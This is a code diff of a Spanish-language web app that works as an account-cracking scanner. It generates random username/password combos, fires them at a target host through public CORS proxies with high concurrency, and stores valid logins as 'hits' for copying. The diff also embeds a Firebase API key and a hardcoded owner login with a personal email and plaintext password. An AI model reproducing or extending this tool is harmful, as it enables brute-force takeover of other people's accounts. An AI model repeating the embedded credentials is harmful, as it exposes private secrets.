@@ -439,9 +439,6 @@
     </div>
 
     <script>
-        // ======================================================================
-        // CONFIGURACIÓN DE TU PROYECTO FIREBASE OFICIAL
-        // ======================================================================
         const firebaseConfig = {
           apiKey: "AIzaSyDGE5GTlwIypuryIVnDYiTR9a2wyCgWkfs",
           authDomain: "gestion-ventas-pro-f8de4.firebaseapp.com",
@@ -460,13 +457,11 @@
         let currentUser = null;
         let usernameClave = ""; 
 
-        // FUNCIÓN DE SANEAMIENTO VELOZ DE CARACTERES PARA EVITAR BUCLES
         function limpiarClaveLocal(str) {
             if (!str) return "";
             return str.toLowerCase().trim().replace(/[\.\$\#\[\]\@]/g, "_");
         }
 
-        // --- PROCESAR LOGIN DE TUS CUENTAS ---
         function procesarLogin() {
             const emailInput = document.getElementById('loginEmail').value.trim().toLowerCase();
             const passInput = document.getElementById('loginPass').value.trim();
@@ -476,7 +471,6 @@
                 return;
             }
 
-            // Tus accesos maestros directos (Tanto por usuario como por correo)
             if((emailInput === "andy" || emailInput === "andyobregon799@gmail.com") && passInput === "andy799") { 
                 ingresarAlSistema(emailInput, "Owner");
                 return;
@@ -533,7 +527,7 @@
             document.getElementById('main-app').style.display = 'none';
         }
 
-        // --- CREAR VENDEDOR TOTALMENTE AGILIZADO Y CORREGIDO ---
+        // --- CREAR VENDEDOR CORREGIDO ---
         function crearVendedorFirebase() {
             const emailVendedor = document.getElementById("newAdminEmail").value.trim();
             const passVendedor = document.getElementById("newAdminPass").value.trim();
@@ -562,7 +556,7 @@
                 if (error) {
                     alert("❌ Error al guardar en Firebase: " + error.message);
                 } else {
-                    alert(`✅ ¡Usuario Registrado con Éxito!\n\nEl vendedor "${emailVendedor}" ya está guardado y activo en el sistema.`);
+                    alert(`✅ ¡Usuario Registrado con Éxito!`);
                     document.getElementById("newAdminEmail").value = "";
                     document.getElementById("newAdminPass").value = "";
                 }
@@ -603,7 +597,6 @@
             }
         }
 
-        // --- GENERACIÓN DE COMBOS MASIVOS ---
         function randomString(length){
             const chars="abcdefghijklmnopqrstuvwxyz0123456789";
             let result="";
@@ -685,7 +678,6 @@
             document.body.appendChild(a); a.click(); a.remove();
         }
 
-        // --- BLOC URLS LOCAL ---
         function guardarUrlBloc() {
             const val = document.getElementById('inputUrlData').value.trim();
             const editId = document.getElementById('editUrlId').value;
@@ -704,20 +696,6 @@
 
             localStorage.setItem('sys_urls', JSON.stringify(baseUrls));
             document.getElementById('inputUrlData').value = "";
-            renderizarUrlsBloc();
-        }
-
-        function usarUrlEscanner(index) {
-            const baseUrls = JSON.parse(localStorage.getItem('sys_urls'));
-            document.getElementById('hostInput').value = baseUrls[usernameClave][index].split(" - ")[0].trim();
-            switchTab('scanner');
-            updateStartState();
-        }
-
-        function eliminarUrl(index) {
-            const baseUrls = JSON.parse(localStorage.getItem('sys_urls'));
-            baseUrls[usernameClave].splice(index, 1);
-            localStorage.setItem('sys_urls', JSON.stringify(baseUrls));
             renderizarUrlsBloc();
         }
 
@@ -743,32 +721,25 @@
             });
         }
 
-        // --- BANCO HITS LOCAL Y CONTADORES ---
+        function usarUrlEscanner(index) {
+            const baseUrls = JSON.parse(localStorage.getItem('sys_urls'));
+            document.getElementById('hostInput').value = baseUrls[usernameClave][index].split(" - ")[0].trim();
+            switchTab('scanner');
+        }
+
+        function eliminarUrl(index) {
+            const baseUrls = JSON.parse(localStorage.getItem('sys_urls'));
+            baseUrls[usernameClave].splice(index, 1);
+            localStorage.setItem('sys_urls', JSON.stringify(baseUrls));
+            renderizarUrlsBloc();
+        }
+
         function guardarHitEnBanco(hitTexto, user, pass) {
             const baseHits = JSON.parse(localStorage.getItem('sys_saved_hits')) || {};
             if(!baseHits[usernameClave]) baseHits[usernameClave] = [];
             if (baseHits[usernameClave].some(h => h.user === user && h.pass === pass)) return;
 
             baseHits[usernameClave].push({ id: Date.now() + Math.random(), user, pass, texto: hitTexto, copies: 0 });
-            localStorage.setItem('sys_saved_hits', JSON.stringify(baseHits));
-            renderizarBancoHits();
-        }
-
-        function copiarHitConContador(hitId) {
-            const baseHits = JSON.parse(localStorage.getItem('sys_saved_hits'));
-            const item = baseHits[usernameClave].find(h => h.id == hitId);
-            if(item) {
-                item.copies = (item.copies || 0) + 1;
-                localStorage.setItem('sys_saved_hits', JSON.stringify(baseHits));
-                navigator.clipboard.writeText(item.texto).then(() => {
-                    renderizarBancoHits();
-                });
-            }
-        }
-
-        function borrarHitBanco(hitId) {
-            const baseHits = JSON.parse(localStorage.getItem('sys_saved_hits'));
-            baseHits[usernameClave] = baseHits[usernameClave].filter(h => h.id != hitId);
             localStorage.setItem('sys_saved_hits', JSON.stringify(baseHits));
             renderizarBancoHits();
         }
@@ -793,23 +764,32 @@
             });
         }
 
+        function copiarHitConContador(hitId) {
+            const baseHits = JSON.parse(localStorage.getItem('sys_saved_hits'));
+            const item = baseHits[usernameClave].find(h => h.id == hitId);
+            if(item) {
+                item.copies = (item.copies || 0) + 1;
+                localStorage.setItem('sys_saved_hits', JSON.stringify(baseHits));
+                navigator.clipboard.writeText(item.texto).then(() => renderizarBancoHits());
+            }
+        }
+
+        function borrarHitBanco(hitId) {
+            const baseHits = JSON.parse(localStorage.getItem('sys_saved_hits'));
+            baseHits[usernameClave] = baseHits[usernameClave].filter(h => h.id != hitId);
+            localStorage.setItem('sys_saved_hits', JSON.stringify(baseHits));
+            renderizarBancoHits();
+        }
+
         function switchTab(tabName) {
             document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
             document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
             document.getElementById('panel-' + tabName).classList.add('active');
-            
-            // Marcar botón activo
             const btn = Array.from(document.querySelectorAll('.tab-btn')).find(b => b.getAttribute('onclick').includes(tabName));
             if(btn) btn.classList.add('active');
         }
 
-        // --- ESCÁNER DE CUENTAS MULTI-BOTS ---
-        const CORS_PROXIES = [
-            'https://api.allorigins.win/raw?url={url}',
-            'https://corsproxy.io/?{url}',
-            'https://api.codetabs.com/v1/proxy/?quest={url}'
-        ];
-
+        const CORS_PROXIES = ['https://api.allorigins.win/raw?url={url}', 'https://corsproxy.io/?{url}', 'https://api.codetabs.com/v1/proxy/?quest={url}'];
         const hostInput = document.getElementById('hostInput');
         const concurrencyInput = document.getElementById('concurrencyInput');
         const startBtn = document.getElementById('startBtn'), stopBtn = document.getElementById('stopBtn'), saveBtn = document.getElementById('saveBtn');
@@ -862,15 +842,12 @@
                         if(data && data.user_info && (data.user_info.status === 'Active' || data.user_info.auth == 1)) {
                             const exp = data.user_info.exp_date ? new Date(data.user_info.exp_date*1000).toLocaleDateString() : 'Ilimitado';
                             const texto = `🔥 HIT ENCONTRADO 🔥\n🌐 Host: ${host}\n👤 Usuario: ${user}\n🔑 Pass: ${pass}\n⏳ Expira: ${exp}`;
-                            
                             HITS[jobId].push({ user, pass, texto });
                             countSpan.innerHTML = `Hits: <span class="yellow-hit">${HITS[jobId].length}</span>`;
-                            
                             const div = document.createElement('div');
                             div.className = 'hit-block';
                             div.innerHTML = `<pre class="hit-content">${texto}</pre>`;
                             hitsContainer.prepend(div);
-                            
                             guardarHitEnBanco(texto, user, pass);
                         }
                     }catch(_){}
@@ -909,15 +886,12 @@
             isRunning = true; stopRequested = false;
             startBtn.disabled = true; stopBtn.disabled = false;
             if(combosTxt.length) { combos1 = combos1.concat(combosTxt); combosTxt = []; }
-
             const host = hostInput.value.replace(/^https?:\/\//,'').trim();
             const conc = parseInt(concurrencyInput.value) || 80;
-
             const jobs = [];
             if(combos1.length) jobs.push(processarCombosJob(host, combos1, Math.floor(conc/3)||20, 1));
             if(combos2.length) jobs.push(processarCombosJob(host, combos2, Math.floor(conc/3)||20, 2));
             if(combos3.length) jobs.push(processarCombosJob(host, combos3, Math.floor(conc/3)||20, 3));
-
             Promise.allSettled(jobs).then(() => {
                 isRunning = false; stopBtn.disabled = true; startBtn.disabled = false; saveBtn.disabled = false;
             });
